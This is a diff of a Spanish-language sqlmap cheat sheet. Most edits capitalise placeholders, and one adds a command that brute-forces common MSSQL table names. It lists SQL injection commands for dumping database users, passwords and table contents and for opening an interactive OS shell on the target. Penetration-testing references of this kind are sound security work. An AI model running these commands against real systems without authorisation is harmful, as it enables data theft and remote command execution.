@@ -42,17 +42,17 @@ sqlmap -u "<URL>" --search -C pass
 
 #### Especificar el Sistema Gestor de Base de Datos
 ```
-sqlmap -u "<URL>" --dbms=<Name-DBMS>
+sqlmap -u "<URL>" --dbms=<NAME-DBMS>
 ```
 
 #### Listar los usuarios de la BD del sitio
 ```
-sqlmap -u "<URL>" --cookie="<Cookie-Value>" --users
+sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" --users
 ```
 
 #### Mostrar los privilegios del usuario de la BD
 ```
-sqlmap -u "<URL>" --cookie="<Cookie-Value>" --current-user --privileges
+sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" --current-user --privileges
 ```
 
 #### Mostrar los errores del DBMS para poder arreglarlos
@@ -67,37 +67,37 @@ sqlmap -u "<URL>" --passwords --batch
 
 #### Listar las Bases de Datos del sitio
 ```
-sqlmap -u "<URL>" --cookie="<Cookie-Value>" --dbs
+sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" --dbs
 ```
 
 #### Listar las tablas de una Base de Datos
 ```
-sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> --tables
+sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" -D <TARGET-DB> --tables
 ```
 
 #### Listar las columnas de una Tabla
 ```
-sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --columns
+sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" -D <TARGET-DB> -T <TARGET-TABLE> --columns
 ```
 
 #### Ver contenido de ciertas Columnas de una Tabla
 ```
-sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> -C <Column1,Column2> --dump
+sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" -D <TARGET-DB> -T <TARGET-TABLE> -C <COLUMN1,COLUMN2> --dump
 ```
 
 #### Ver contenido de solamente de la segunda y tercera fila de una Tabla
 ```
-sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --start=2 --stop=3 --dump
+sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" -D <TARGET-DB> -T <TARGET-TABLE> --start=2 --stop=3 --dump
 ```
 
 #### Ver todo el contenido de una Tabla de una Base de Datos
 ```
-sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --dump
+sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" -D <TARGET-DB> -T <TARGET-TABLE> --dump
 ```
 
 #### Ver el contenido de una Base de Datos en donde un campo llamado 'name' y solamente muestre datos donde inician con la letra 'f'
 ```
-sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --dump --where="name LIKE 'f%'"
+sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" -D <TARGET-DB> -T <TARGET-TABLE> --dump --where="name LIKE 'f%'"
 ```
 
 #### Dumpear todas las bases de datos que existan en el servidor excluyendo las bases de datos del sistema.
@@ -120,9 +120,14 @@ sqlmap -u "<URL>" --no-cast --dump --dump-format=HTML
 sqlmap -u "<URL>" --no-cast --dump --dump-format=SQLITE
 ```
 
+#### Brute force a tablas comunes
+```
+sqlmap -r request.txt --dbms=mssql --common-tables -D <TARGET-DB>
+```
+
 #### Obtener un Shell de OS interactivo
 ```
-sqlmap -u "<URL>" --cookie="<Cookie-Value>" --os-shell
+sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" --os-shell
 ```
 
 #### Listar BD, usando un parámetro de 'User-Agent' con el método GET
@@ -188,7 +193,7 @@ sqlmap -u "<URL>" -p <PARAMETER> --threads=2 --level=3 --risk=2 --no-cast -A "NO
 
 #### Ignorar cualquier sesión previa (si se trata del mismo sitio) para que realice otro escaneo
 ```
-sqlmap -u "<URL>" --cookie="<Cookie-Value>" --dbs --flush-session
+sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" --dbs --flush-session
 ```
 
 #### Usar en formulario de Login cargado desde un archivo, para enviar datos en POST y usando la técnica BLIND, para obtener el nombre de la BD
